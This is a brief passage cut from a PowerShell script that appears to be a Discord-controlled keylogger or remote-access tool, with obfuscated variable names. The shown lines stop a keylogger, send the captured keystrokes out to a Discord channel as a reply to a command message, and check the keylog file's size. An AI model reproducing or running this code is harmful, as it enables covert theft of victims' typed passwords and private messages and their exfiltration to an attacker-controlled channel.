                    return
                }
                $KxbFqf = Stop-KeyLog
                Send-DiscordMessage -Content $KxbFqf -ReplyToId $msgId
                if (Test-Path -LiteralPath $script:keylogLogFile) {
                    $Jw1md = (Get-Item $script:keylogLogFile).Length
